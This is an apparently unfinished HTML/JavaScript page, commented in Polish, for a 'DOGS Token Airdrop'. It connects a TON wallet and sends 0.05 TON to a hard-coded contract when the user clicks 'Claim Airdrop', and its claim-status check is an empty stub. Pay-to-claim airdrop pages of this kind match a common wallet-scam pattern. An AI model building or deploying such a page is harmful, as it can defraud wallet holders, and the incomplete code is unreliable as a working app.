<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOGS Token Airdrop</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/ton-core@latest/dist/ton-core.js"></script>
    <script src="https://unpkg.com/ton-crypto@latest/dist/ton-crypto.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        button {
            padding: 10px 20px;
            margin: 10px 0;
            cursor: pointer;
        }
        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>DOGS Token Airdrop</h1>
    <div id="wallet-connection"></div>
    <button id="claimButton" style="display: none;">Claim Airdrop</button>
    <div id="status"></div>

    <script>
        // Konfiguracja TonConnect
        const tonConnectUI = new TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'wallet-connection'
        });

        // Adres kontraktu airdropa
        const AIRDROP_CONTRACT_ADDRESS = 'EQAj2hi6_JljnyupUJqqWduHyQ_74Uf23FcVQmdXy9KWVnQY';

        // Nasłuchiwanie na zmiany stanu połączenia
        tonConnectUI.onStatusChange(async (wallet) => {
            const claimButton = document.getElementById('claimButton');
            if (wallet) {
                claimButton.style.display = 'block';
                // Sprawdź czy użytkownik już odebrał airdrop
                await checkClaimStatus(wallet.account.address);
            } else {
                claimButton.style.display = 'none';
                setStatus('');
            }
        });

        // Funkcja do sprawdzania statusu claima
        async function checkClaimStatus(userAddress) {
            try {
                // Tu dodaj kod do wywołania metody get hasClaimedAirdrop
                // i zaktualizuj status odpowiednio
            } catch (error) {
                setStatus('Error checking claim status: ' + error.message, 'error');
            }
        }

        // Obsługa przycisku claim
        document.getElementById('claimButton').addEventListener('click', async () => {
            if (!tonConnectUI.connected) {
                setStatus('Please connect your wallet first', 'error');
                return;
            }

            try {
                setStatus('Claiming airdrop...', 'info');

                // Przygotowanie transakcji
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sekund ważności
                    messages: [
                        {
                            address: AIRDROP_CONTRACT_ADDRESS,
                            amount: '50000000', // 0.05 TON w nanach
                            payload: 'claim' // Message to wywołanie funkcji claim
                        }
                    ]
                };

                // Wysłanie transakcji
                const result = await tonConnectUI.sendTransaction(transaction);
                
                setStatus('Transaction sent! Waiting for confirmation...', 'info');
                
                // Tu możesz dodać kod do śledzenia statusu transakcji
                
            } catch (error) {
                setStatus('Error claiming airdrop: ' + error.message, 'error');
            }
        });

        // Funkcja pomocnicza do wyświetlania statusu
        function setStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.style.backgroundColor = type === 'error' ? '#ffebee' : '#e3f2fd';
        }
    </script>
</body>
</html>
            